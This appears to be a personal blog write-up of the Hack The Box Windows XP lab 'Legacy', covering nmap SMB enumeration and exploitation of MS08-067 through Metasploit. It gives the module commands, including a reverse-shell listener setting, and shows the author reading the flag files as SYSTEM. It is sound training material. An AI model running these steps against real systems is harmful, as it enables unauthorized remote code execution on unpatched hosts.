+++
date = '2026-07-21T02:48:50+02:00'
draft = false
title = 'Legacy Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`19/04/2026`**

![Legacy.png](/images/imgs_legacy/Legacy.png)

---
# Introduction

**_Legacy_** is an **Easy-level Windows** box that lives entirely up to its name. It is a very straightforward machine that highlights the extreme risks of exposing outdated, unpatched services, specifically **SMB**, on legacy operating systems like **Windows XP**. It's a perfect lab for beginners, I tackled it strictly following the **eJPT** methodology, since I was preparing for that certification. The exploitation path requires no lateral movement or privilege escalation, as it is a direct one-shot to **NT AUTHORITY\SYSTEM** using a classic **CVE**.

---
# Techniques Used

- **SMB Enumeration**

- **Vulnerability Scanning (Nmap Scripts)**

- **Metasploit Framework**

- **Exploitation of MS08-067 (CVE-2008-4250)**

# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- -oA nmap/all legacy -Pn
```

```text
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -oA nmap/services legacy -Pn
```

```text
PORT     STATE    SERVICE        REASON          VERSION
135/tcp  open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open     netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds   syn-ack ttl 127 Windows XP microsoft-ds
1035/tcp filtered multidropper   no-response
1719/tcp filtered h323gatestat   no-response
6547/tcp filtered powerchuteplus no-response
6567/tcp filtered esp            no-response
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16915/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46814/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60321/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7522/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-04-24T20:45:50+03:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:69:ab (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 94 69 ab 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
```

**Open ports**:

- **135**/tcp - MSRPC

- **139**/tcp - NetBIOS

- **445**/tcp - SMB

Looking at the nmap output, I immediately noticed the line **`_smb2-time: Protocol negotiation failed (SMB2)`**, which strongly implies the machine is running **SMBv1**.

To confirm my suspicions, I ran a targeted scan using nmap's **SMB** vulnerability scripts:

```bash
nmap --script=smb-vuln* legacy -p 445
```

![smb-vulns.png](/images/imgs_legacy/smb-vulns.png)

The scan returned positive for two critical vulnerabilities: 
- **CVE-2008-4250** (module **`ms08_067_netapi`**).
- **CVE-2017-0143** (**`ms17_010`**, aka **EternalBlue**).

---
# Exploitation | MS08-067

**Note**: _The **`MS08-067`** (**CVE-2008-4250**) vulnerability is a **stack-based buffer overflow** in the **`Netapi32.dll`** library. It exploits a flaw in how the **Windows** Server service handles **RPC** requests (specifically, the **`NetPathCanonicalize`** function). By sending a maliciously crafted string, an attacker can overwrite the buffer and execute arbitrary code. Both **`MS08-067`** and **`MS17-010`** are iconic, highly critical vulnerabilities that grant **Unauthenticated Remote Code Execution** (**RCE**) with **`NT AUTHORITY\SYSTEM`** privileges. While **EternalBlue** is extremely famous, I opted for **`MS08-067`** this time simply because I had already exploited **`MS17-010`** multiple times on different boxes._

To keep things organized, I started the **PostgreSQL** database, launched **msfconsole**, created a dedicated workspace, and imported the **XML** nmap outputs I generated earlier.

```bash
service start postgresql
msfconsole
```

Within **Metasploit**:

```bash
workspace -a legacy
db_import ~/HTB/Machines/Legacy/nmap/all.xml
db_import ~/HTB/Machines/Legacy/nmap/services.xml
```

![ws.png](/images/imgs_legacy/ws.png)

Next, I searched for the **`ms08_067`** module and 
configured the required options.

```bash
search ms08_067
use 0
show options
set RHOSTS legacy
set LHOST tun0
set LPORT 22667
exploit
```

![ms.png](/images/imgs_legacy/ms.png)
![so.png](/images/imgs_legacy/so.png)
![exploit.png](/images/imgs_legacy/exploit.png)

Since this vulnerability directly compromises the system at the highest privilege level, there was no need for a separate privilege escalation phase. 

I dropped into a standard shell and grabbed both the **user** and **root flags**.

```cmd
shell
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

![user.png](/images/imgs_legacy/user.png)
![root.png](/images/imgs_legacy/root.png)

---
# Final Thoughts

**_Legacy_** is literally a piece of cake of a box, serving mostly as a beginner-friendly introduction to **Metasploit** and classic **Windows CVEs**. While it doesn't offer a complex exploitation chain, it acts as a great reminder of how devastating legacy protocols like **SMBv1** can be if left enabled on a network. Applying the **eJPT** methodology here was a perfect fit: structured enumeration, vulnerability scanning, and clean execution via **MSF** database management made the entire process incredibly smooth.